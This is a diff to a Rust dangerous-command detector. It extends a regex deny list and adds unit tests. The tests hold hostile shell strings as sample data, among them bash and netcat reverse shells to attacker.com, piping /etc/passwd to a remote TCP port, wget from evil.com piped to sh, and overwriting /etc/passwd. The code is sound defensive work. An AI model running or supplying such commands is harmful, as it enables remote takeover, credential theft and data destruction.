@@ -8,15 +8,33 @@ pub struct DangerResult {
 }
 
 static DANGEROUS_PATTERNS: &[(&str, &str)] = &[
-    (r"rm\s+-rf",          "Recursive force delete"),
-    (r"sudo\s+",           "Elevated privileges required"),
-    (r"chmod\s+777",       "Insecure file permissions"),
-    (r"curl[^|]+\|\s*sh",  "Piping curl to shell"),
-    (r"curl[^|]+\|\s*bash","Piping curl to bash"),
-    (r">\s*/dev/sd",       "Writing to block device"),
-    (r"mkfs",              "Filesystem formatting"),
-    (r"dd\s+if=",          "Low-level disk operation"),
-    (r":\(\)\{.*\}",       "Fork bomb detected"),
+    // Destructive file operations
+    (r"rm\s+(-[^\s]*f[^\s]*r|-[^\s]*r[^\s]*f|--recursive|--force)",
+                                "Recursive force delete"),
+    (r">\s*/etc/",              "Overwriting system configuration file"),
+    (r">\s*/dev/sd",            "Writing to block device"),
+    // Privilege escalation
+    (r"sudo\s+",                "Elevated privileges required"),
+    (r"chmod\s+(777|[+]s|u[+]s|g[+]s)",
+                                "Insecure file permissions or SUID bit"),
+    // Remote code execution (pipe-to-shell)
+    (r"curl[^|]*\|\s*(ba)?sh", "Piping curl to shell"),
+    (r"wget[^|]*\|\s*(ba)?sh", "Piping wget to shell"),
+    // Encoded payload execution
+    (r"base64\s*(-d|--decode)[^|]*\|[^|]*(ba)?sh",
+                                "Executing base64-decoded payload"),
+    (r"openssl\s+enc[^|]*\|[^|]*(ba)?sh",
+                                "Executing decoded payload"),
+    // Reverse shells
+    (r"bash\s+-i\s*>&\s*/dev/tcp",
+                                "Bash reverse shell detected"),
+    (r"nc(at)?\s+.*(--exec|-e)\s+", "Netcat reverse shell detected"),
+    (r"/dev/tcp/",              "TCP device redirection (possible reverse shell)"),
+    // Disk / filesystem operations
+    (r"mkfs",                   "Filesystem formatting"),
+    (r"dd\s+if=",               "Low-level disk operation"),
+    // Fork bomb
+    (r":\(\)\{.*\}",            "Fork bomb detected"),
 ];
 
 static COMPILED: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();
@@ -64,6 +82,8 @@ mod tests {
     fn test_rm_rf() {
         assert_dangerous("rm -rf /tmp/test", "Recursive force delete");
         assert_dangerous("rm -rf /", "Recursive force delete");
+        assert_dangerous("rm -fr /tmp/test", "Recursive force delete");
+        assert_dangerous("rm --recursive --force /", "Recursive force delete");
     }
 
     #[test]
@@ -74,20 +94,44 @@ mod tests {
 
     #[test]
     fn test_chmod_777() {
-        assert_dangerous("chmod 777 /etc/passwd", "Insecure file permissions");
-        assert_dangerous("chmod 777 myfile", "Insecure file permissions");
+        assert_dangerous("chmod 777 /etc/passwd", "Insecure file permissions or SUID bit");
+        assert_dangerous("chmod 777 myfile", "Insecure file permissions or SUID bit");
+        assert_dangerous("chmod +s /bin/bash", "Insecure file permissions or SUID bit");
+        assert_dangerous("chmod u+s /usr/bin/vim", "Insecure file permissions or SUID bit");
     }
 
     #[test]
     fn test_curl_pipe_sh() {
         assert_dangerous("curl https://example.com/install.sh | sh", "Piping curl to shell");
         assert_dangerous("curl -s http://evil.com/script | sh", "Piping curl to shell");
+        assert_dangerous("curl https://example.com/install.sh | bash", "Piping curl to shell");
+        assert_dangerous("curl -sSL http://get.example.com | bash", "Piping curl to shell");
     }
 
     #[test]
-    fn test_curl_pipe_bash() {
-        assert_dangerous("curl https://example.com/install.sh | bash", "Piping curl to bash");
-        assert_dangerous("curl -sSL http://get.example.com | bash", "Piping curl to bash");
+    fn test_wget_pipe_shell() {
+        assert_dangerous("wget -O- https://evil.com/script | sh", "Piping wget to shell");
+        assert_dangerous("wget -qO- http://evil.com/script.sh | bash", "Piping wget to shell");
+    }
+
+    #[test]
+    fn test_base64_decode_pipe_shell() {
+        assert_dangerous("echo cm0gLXJm | base64 -d | sh", "Executing base64-decoded payload");
+        assert_dangerous("echo dGVzdA== | base64 --decode | bash", "Executing base64-decoded payload");
+    }
+
+    #[test]
+    fn test_reverse_shell() {
+        assert_dangerous("bash -i >& /dev/tcp/attacker.com/4444 0>&1", "Bash reverse shell detected");
+        assert_dangerous("nc -e /bin/sh attacker.com 4444", "Netcat reverse shell detected");
+        assert_dangerous("ncat --exec /bin/bash attacker.com 4444", "Netcat reverse shell detected");
+        assert_dangerous("cat /etc/passwd > /dev/tcp/attacker.com/9000", "TCP device redirection (possible reverse shell)");
+    }
+
+    #[test]
+    fn test_overwrite_system_config() {
+        assert_dangerous("echo root:x:0:0 > /etc/passwd", "Overwriting system configuration file");
+        assert_dangerous("> /etc/shadow", "Overwriting system configuration file");
     }
 
     #[test]
@@ -122,5 +166,8 @@ mod tests {
         assert_safe("cargo build");
         assert_safe("chmod 755 script.sh");
         assert_safe("rm file.txt");
+        assert_safe("curl https://example.com -o output.txt");
+        assert_safe("wget https://example.com/file.zip");
+        assert_safe("echo hello | base64");
     }
 }
